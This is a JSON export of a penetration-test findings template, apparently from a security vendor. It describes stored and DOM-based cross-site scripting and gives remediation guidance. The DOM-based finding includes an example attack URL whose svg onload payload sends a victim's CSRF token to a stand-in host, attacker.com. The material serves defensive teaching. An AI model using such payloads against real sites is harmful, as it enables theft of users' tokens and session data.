{"practiceType":"Secure Development","selectedClient":"Standard","associated":[],"metadata":{"clientName":"Standard","clientAddress":"","appName":"","appDescription":"","testType":"Penetration Test - Essential","startDate":"","endDate":"","scope":"","scopeType":"","outOfScope":"","outOfScopeType":"","controlList":"","consultantName":"","consultantTitle":"","consultantNumber":"","consultantEmail":"","oversightName":"","oversightTitle":"Security Consultant","oversightNumber":"703-404-9293 x","oversightEmail":"@synopsys.com","clientManagerName":"","clientManagerTitle":"","clientManagerNumber":"703-404-9293 x","clientManagerEmail":"@synopsys.com","confidentiality":"","integrity":"","availability":"","hash":"671a150524115bebb83a413aff86231f28604a2ea04c930ae3cf27e531b78be4","versionNumber":"2019.03","isTWBAssessment":"false","testID":"","totalInstances":0,"pciReport":false,"retest":false},"findings":[{"identifier":33663,"name":"Stored Cross-Site Scripting (XSS)","description":"A Stored Cross-Site Scripting (XSS) vulnerability occurs when a web application sends stored strings that were provided by an attacker to a victim's browser in such a way that the browser executes part of the string as code. The string contains malicious data and is initially stored server-side, often in the application's database. The application later retrieves the malicious data and inserts it into a web page. This results in the victim's browser executing the attacker's code within a legitimate user's session.<br>Stored Cross-Site Scripting vulnerabilities give the attacker control of HTML and JavaScript running the user's browser. The attack can alter page content with malicious HTML or JavaScript code. The attacker can arbitrarily alter page content displayed to the victim and can execute application functions using the victim's application identity if the victim is authenticated to the application. An often cited example use of a Stored Cross-Site is where the attacker sends himself/herself the victim's session identifier. With this session identifier, the attacker can then perform application functions using that user's identity for the duration of that session.","note":"","instances":[],"systemic":"false","fixLocation":null,"screenshots":[],"stepsToReproduce":"","likelihoodDescription":"","impactDescription":"","contextDescription":"","remediation":"Stored Cross-Site Scripting (XSS) is prevented by encoding data before inserting it into the generated web page. Each character of the data is encoded and the result string is then inserted onto the generated web page. This technique of encoding values before inserting them on the web page is called \"Output Encoding\". Output Encoding libraries exist for most popular programming languages and frameworks.<br>\nA web page has seven different output contexts and each output context requires a different encoding scheme. Data must be encoded using the proper scheme. The seven different encoding schemes are:<br>\n<ul>\n<li>HTML Text Element</li>\n<li>HTML Attribute</li>\n<li>URL Parameter</li>\n<li>JavaScript Literal</li>\n<li>HTML Comment</li>\n<li>HTTP Header</li>\n<li>CSS Property\nFor example, the characters: &lt;, &gt;, \", ' are encoded as &amp;#60;, &amp;#62;, &amp;#34;, &amp;#39; for when those characters are inserted into an HTML Text Element. When those characters are inserted as a URL Parameter, the same characters are encoded as %3C, %3E, %22, %27.</li>\n</ul>\nLibraries for implementing the encoding schemes exist for most popular programming languages.<br>\n<ul>\n<li>OWASP Java Encoder: Java only<br></li>\n<li>Microsoft Web Protection Library: .NET languages<br></li>\n<li>Ruby - escapeHTML() - only supports HTML Text Encoding<br></li>\n<li>Jgencoder in JQuery: for preventing DOM-based XSS\nGreen field projects can consider the use of other technologies:<br></li>\n<li>Google Capabilities based JavaScript CAJA<br></li>\n<li>OWASP JXT- automatically encodes string data with the proper encoding\nInput validation is often recommended as a way to mitigate stored cross-site scripting. It is insufficient, however, because two separate applications are often involved: the first stores the malicious string and a second application generates the web page. The application generating the page cannot assume that the application storing the value has filtered out malicious data. In cases where a single application retrieves, stores, and redisplays data to the user, input validation can be used to prevent cross-site scripting only when the data has a strict syntactic format, such as numeric values and dates. Any application inputs which must accept arbitrary data would remain vulnerable.<br></li>\n</ul>","foundBy":"Manual","risk":{"type":"NIST","impact":"Critical","likelihood":"Critical","severity":"Critical"},"bnySeverityRiskLevels":["--select severity--","Critical","High","Medium","Low","Informational"],"cvdId":"5","appscanTitle":"","itrc":"","cweId":"79","cweIdFlawName":"","cweIdCategory":"","pciId":"6.5.7 ","pciDesc":" Cross-site Scripting","flawCount":0},{"identifier":1639,"name":"DOM-Based Cross-Site Scripting","description":"DOM-based cross-site scripting (XSS) is a client-side injection issue where an attacker inserts a malicious script into the Document Object Model (DOM) modifying application's behavior. The DOM is a standardized programming interface that enables applications and scripts to dynamically update the structure, content, and layout of a web page.<br>\nIn a DOM-based XSS scenario, the attacker sends malicious strings to a victim's browser in such a way that the browser executes part of the string as code. The main difference between DOM-based and traditional, server-side XSS is that in a DOM-based XSS attack the payload (malicious string) is injected during runtime by the client, while in a traditional XSS it is injected into the application response during server-side processing and then sent to the browser.<br>\nThis vulnerability manifests itself throughout many different contexts. The application uses untrusted input in JavaScript methods and attributes that render HTML, such as:<br>\n<ul>\n<li>element.innerHTML - a property that sets or gets the HTML syntax describing the element's descendants.<br></li>\n<li>element.outerHTML - a property that sets or gets the HTML fragment describing the element and its descendants.\nThe application uses untrusted data in JavaScript contexts that may execute JavaScript dynamically, such as:<br></li>\n<li>eval - a function that evaluates its argument as JavaScript code.<br></li>\n<li>setTimeOut - a function that evaluates a string after a specified number of milliseconds.<br></li>\n<li>setInterval - a function that evaluates a string every specified number of milliseconds.<br></li>\n<li>new Function - a constructor that creates JavaScript functions dynamically.<br></li>\n<li>setAttribute - a function that sets an attribute on the specified element.<br></li>\n<li>document.write and document.writeln - functions that write a string to a document. The string may contain HTML tags, as well as a &lt;script&gt; tag with JavaScript code.<br></li>\n<li>any event handler, as they execute JavaScript.\nUntrusted input can come from many sources including (but not limited to):<br></li>\n<li>document.location - returns an object that contains information from the URI. The object also has methods for changing the URI or loading another URI for browser redirection.<br></li>\n<li>document.url - retrieves the URI as a string.<br></li>\n<li>document.referer - returns the URI that linked to the current page.\nThe example below is vulnerable to DOM-based XSS. The JavaScript code adds the error message from the fragment identifier (everything after #) to the page using the innerHTML property. <br></li>\n</ul>\n<code>&lt;p&gt;&lt;b id='err'&gt;&lt;/b&gt;&lt;/p&gt;\n&lt;input type=hidden id=_csrf value=\"wS2sCg7DA0\" /&gt;\n&lt;script&gt;document.getElementById('err').innerHTML = window.location.hash.substring(1);&lt;/script&gt;\n</code>\nIn a normal use case, a user fetches the page with a URL such as:<br>\n<code>https://example.com/updateItems.html#Item unavailable\n</code>\nNote that the browser does not send the fragment identifier to the server.<br>\nAn attacker can execute a DOM-based XSS attack against this page by sending the following URL to a victim:<br>\n<code>https://example.com/updateItems.html#&lt;svg/onload='document.write(\"&lt;img src=http://attacker.com/listentodata?token=\"+document.getElementById(\"_csrf\").value+\" /&gt;&lt;/img&gt;\")'&gt;\n</code>\nIn this case, the JavaScript code on the page adds the SVG tag to the 'err' element via the innerHTML property. Once the SVG tag is added, its 'onload' method is called. That method executes the event handler which writes an image tag to the page with the source attribute set to an attacker website. The source URL is dynamically created by concatenating the attacker's website URL and sensitive data from the victim's page, such as the value of the CSRF token stored in the element with the \"_csrf\" id. The element added to the page will look like the following.<br>\n<code>&lt;img src=\"http://attacker.com/listentodata?token=wS2sCg7DA0\"&gt;\n</code>\nWhen the browser adds the image tag, it tries to fetch the image from the provided URL. Therefore, the attacker's website receives a request exposing the victim's CSRF token in a GET parameter. <br>Like in traditional XSS vulnerabilities, an attacker can steal any sensitive information from the page, arbitrarily alter the page content, and execute application functions using the victim's identity if the victim is authenticated to the application.","note":"","instances":[],"systemic":"false","fixLocation":null,"screenshots":[],"stepsToReproduce":"","likelihoodDescription":"","impactDescription":"","contextDescription":"","remediation":"Use the correct remediation approach depending on the JavaScript execution context. Similar to traditional XSS mitigations, DOM-based XSS is mitigated using output encoding and input validation. Output encoding technique should match the JavaScript execution context, such as HTML, HTML attribute, URL, etc. Contrary to the traditional XSS mitigation, in DOM-based XSS, some contexts cannot be mitigated with output encoding and, therefore, require input validation. In all cases, the mitigation must be done in the client-side code. <br>\nDifferent mitigation techniques apply to different JavaScript execution contexts:<br>\n<ul>\n<li>HTML context. Use the correct element property, such as textContent, innerText or outerText, so that the inserted data is automatically output-encoded by the browser. </li>\n<li>HTML attributes. When the setAttribute() function is used with untrusted data in both the name of the attribute and its value, use exact match to limit the attribute names that a user can set. These should only be safe attributes that do not execute JavaScript, such as 'align', 'alink', 'alt', 'value' and not event handlers or URI-type attributes. When untrusted data is used to set the value of the attribute, make sure that the attribute is not an event handler or a source. In addition, use input validation for the attribute's values, where appropriate (for example, for numeric values, such as 'width', 'height').</li>\n<li>URL context. Use the exact match approach or mapping. If the application must allow users to provide any URL, at the minimum, validate the schema of the URL to avoid XSS through redirects to 'javascript:' and 'data:' URLs. </li>\n<li>JavaScript context. Redesign the application so untrusted data is not used to dynamically create or modify JavaScript code. If redesign is not possible, use exact match or whitelisting, since JavaScript encoding will not mitigate an injection into a string that is dynamically evaluated by functions like eval(), new Function(), document.write(), or an event handler. \nRemember that server-side validation will not protect the application from DOM-based XSS because in DOM-based injections the payload is evaluated on the client side and not on the server side.</li>\n</ul>\nFor example, if untrusted data passed through the URL fragment must be added to the page, use the innerText property rather than innerHTML. In this case, if the data contains any HTML tags, they will be automatically encoded by the browser.<br>\n<code>&lt;p&gt;&lt;b id='err'&gt;&lt;/b&gt;&lt;/p&gt;\n&lt;input type=hidden id=_csrf value=\"wS2sCg7DA0\" /&gt;\n&lt;script&gt;document.getElementById('err').innerText = window.location.hash.substring(1);&lt;/script&gt;\n</code>","foundBy":"Manual","risk":{"type":"NIST","impact":"High","likelihood":"High","severity":"High"},"bnySeverityRiskLevels":["--select severity--","Critical","High","Medium","Low","Informational"],"cvdId":"389","appscanTitle":"","itrc":"","cweId":"79","cweIdFlawName":"","cweIdCategory":"","pciId":"6.5.7 ","pciDesc":" Cross-site Scripting","flawCount":0}],"customFields":[{"name":"assessmentNotes","label":"Assessment Notes","fieldType":"textarea","value":""}],"riskType":"NIST5","billable":"true","sdr":"false","priorTestingFlag":"false","generatedBy":"tort","totalUploadedFileSize":0}